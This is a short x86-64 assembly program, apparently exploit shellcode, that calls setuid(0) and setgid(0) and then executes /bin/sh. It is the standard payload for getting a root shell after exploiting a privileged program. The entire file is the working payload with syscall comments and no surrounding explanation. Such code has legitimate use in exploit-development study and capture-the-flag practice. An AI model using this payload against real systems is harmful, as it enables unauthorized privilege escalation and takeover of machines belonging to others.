.intel_syntax noprefix
.globl _start

_start:
    mov rax, 105 
    mov rdi, 0
    syscall  # setuid(0);
    
    mov rax, 106 
    mov rdi, 0 
    syscall  # setgid(0);

    lea rdi, [rip+bin_sh]
    mov rsi, 0
    mov rdx, 0 
    mov rax, 59
    syscall  # execve("/bin/sh",0,0);

bin_sh:
    .string "/bin/sh"
